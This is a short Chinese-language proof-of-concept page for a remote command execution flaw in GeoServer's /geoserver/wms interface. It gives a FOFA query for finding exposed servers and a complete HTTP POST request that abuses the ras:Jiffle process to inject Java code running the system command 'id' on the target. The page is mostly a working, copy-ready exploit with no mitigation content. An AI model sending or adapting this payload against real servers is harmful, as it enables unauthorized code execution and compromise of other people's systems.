## GeoServer系统wms接口存在远程命令执行漏洞

GeoServer是OGC Web服务器规范的J2EE实现，利用GeoServer可以方便地发布地图数据，允许用户对要素数据进行更新、删除、插入操作，通过GeoServer可以比较容易地在用户之间迅速共享空间地理信息。GeoServer /geoserver/wms接口存在远程命令执行漏洞



## fofa

```
app="GeoServer"
```



## poc

```bash
POST /geoserver/wms HTTP/1.1
Content-Type: application/xml
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Host: xxx.xxx.xxx.xxx
Content-Length: 1967
Expect: 100-continue
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
  <wps:Execute version="1.0.0" service="WPS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.opengis.net/wps/1.0.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:gml="http://www.opengis.net/gml" xmlns:ogc="http://www.opengis.net/ogc" xmlns:wcs="http://www.opengis.net/wcs/1.1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd">
    <ows:Identifier>ras:Jiffle</ows:Identifier>
    <wps:DataInputs>
      <wps:Input>
        <ows:Identifier>coverage</ows:Identifier>
        <wps:Data>
          <wps:ComplexData mimeType="application/arcgrid"><![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>
        </wps:Data>
      </wps:Input>
      <wps:Input>
        <ows:Identifier>script</ows:Identifier>
        <wps:Data>
          <wps:LiteralData>dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("id").getInputStream())); String line = null; String allLines = " - "; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>
        </wps:Data>
      </wps:Input>
      <wps:Input>
        <ows:Identifier>outputType</ows:Identifier>
        <wps:Data>
          <wps:LiteralData>DOUBLE</wps:LiteralData>
        </wps:Data>
      </wps:Input>
    </wps:DataInputs>
    <wps:ResponseForm>
      <wps:RawDataOutput mimeType="image/tiff">
        <ows:Identifier>result</ows:Identifier>
      </wps:RawDataOutput>
    </wps:ResponseForm>
  </wps:Execute>
```

![image-20240523190346640](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405231903731.png)